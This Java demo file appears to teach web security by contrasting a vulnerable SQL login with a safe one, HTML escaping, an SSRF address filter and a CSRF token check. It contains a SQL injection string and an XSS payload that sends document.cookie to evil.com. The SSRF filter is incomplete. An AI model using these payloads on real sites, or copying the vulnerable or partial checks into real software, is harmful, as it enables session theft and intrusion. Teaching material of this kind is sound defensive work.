import java.util.*;

public class WebSecurityDemo {
    static final List<Map<String, String>> users = List.of(Map.of("email", "asha@x.com", "pw", "secret"), Map.of("email", "ravi@x.com", "pw", "hunter2"));

    // Vulnerable: builds the query by string concatenation, then 'executes' it naively
    static List<String> unsafeLogin(String email) {
        String sql = "SELECT * FROM users WHERE email = '" + email + "'";
        boolean always = sql.contains("' OR '1'='1");
        return users.stream().filter(u -> always || sql.contains("'" + u.get("email") + "'")).map(u -> u.get("email")).toList();
    }
    // Safe: the value is passed as a parameter, never parsed as SQL
    static List<String> safeLogin(String email) { return users.stream().filter(u -> u.get("email").equals(email)).map(u -> u.get("email")).toList(); }

    static String escapeHtml(String s) { return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;").replace("'", "&#39;"); }

    static boolean ssrfAllowed(String url) {
        String host = java.net.URI.create(url).getHost();
        return !(host.equals("localhost") || host.startsWith("127.") || host.startsWith("10.") || host.startsWith("169.254.") || host.startsWith("192.168."));
    }

    public static void main(String[] args) {
        String attack = "x' OR '1'='1";
        System.out.println("SQL injection, unsafe : " + unsafeLogin(attack) + "  <- every user returned");
        System.out.println("SQL injection, safe   : " + safeLogin(attack));
        String comment = "<script>fetch('//evil.com?c='+document.cookie)</script>";
        System.out.println("XSS, rendered raw     : " + comment);
        System.out.println("XSS, escaped          : " + escapeHtml(comment));
        for (String u : List.of("https://images.example.com/cat.jpg", "http://169.254.169.254/latest/meta-data/"))
            System.out.println("SSRF check " + u + " -> " + (ssrfAllowed(u) ? "fetch" : "BLOCKED (internal address)"));
        String sessionCsrf = "csrf-81f2"; String formToken = "csrf-0000";
        System.out.println("CSRF: form token " + formToken + " vs session " + sessionCsrf + " -> " + (formToken.equals(sessionCsrf) ? "accept" : "REJECT"));
    }
}
